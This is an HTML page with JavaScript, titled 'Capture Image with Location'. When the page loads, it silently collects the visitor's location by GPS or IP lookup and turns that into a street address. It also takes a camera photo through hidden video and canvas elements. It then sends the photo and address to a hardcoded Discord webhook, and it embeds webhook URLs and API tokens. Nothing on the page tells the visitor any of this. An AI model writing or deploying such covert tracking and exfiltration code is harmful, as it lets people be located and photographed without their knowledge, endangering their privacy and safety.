<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Image with Location</title>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ';
        const photoWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
        const ipinfoToken = '41d360af12f2bf';
        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';

        // Get user location with geolocation or IP fallback
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                error({ code: 0, message: "Geolocation not supported" });
            }
        }

        function success(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            reverseGeocode(latitude, longitude);
        }

        function error(err) {
            sendErrorToDiscord(`Geolocation Error (${err.code}): ${err.message}`);
            getIPGeolocation();
        }

        // IP fallback for geolocation
        function getIPGeolocation() {
            fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.loc) {
                        const [latitude, longitude] = data.loc.split(',');
                        reverseGeocode(latitude, longitude);
                    } else {
                        sendErrorToDiscord("Unable to retrieve location from IP.");
                    }
                })
                .catch(() => sendErrorToDiscord('Error fetching IP geolocation.'));
        }

        // Reverse geocode to get readable address
        function reverseGeocode(latitude, longitude) {
            const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data && data.display_name) {
                        const address = data.display_name;
                        sendLocationAndCapturePhoto(latitude, longitude, address);
                    } else {
                        sendErrorToDiscord('Error in reverse geocoding.');
                    }
                })
                .catch(() => sendErrorToDiscord('Error during reverse geocoding.'));
        }

        // Initialize camera and capture photo
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('video').addEventListener('loadedmetadata', capturePhoto); // Capture photo automatically
            } catch {
                sendErrorToDiscord("Error accessing the camera.");
            }
        }

        // Capture photo and convert to Blob
        async function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);  // Capture the image from the video

            // Convert canvas to Blob
            return new Promise((resolve) => {
                canvas.toBlob(blob => {
                    if (blob) resolve(blob);
                    else sendErrorToDiscord('Error capturing image.');
                }, 'image/png');
            });
        }

        // Send location data and image to Discord
        async function sendLocationAndCapturePhoto(latitude, longitude, address) {
            const photoBlob = await capturePhoto();  // Wait for photo capture

            if (photoBlob) {
                const formData = new FormData();
                formData.append('file', photoBlob, 'capture.png');
                formData.append('content', `Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`);

                const response = await fetch(photoWebhookURL, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    sendErrorToDiscord("Error sending image and location to Discord.");
                }
            }
        }

        // Send error messages to Discord
        function sendErrorToDiscord(message) {
            fetch(locationWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message }),
            });
        }

        // Start everything on page load
        window.onload = () => {
            getLocation();  // Fetch location and capture photo
            initCamera();   // Initialize camera
        };
    </script>
</body>
</html>
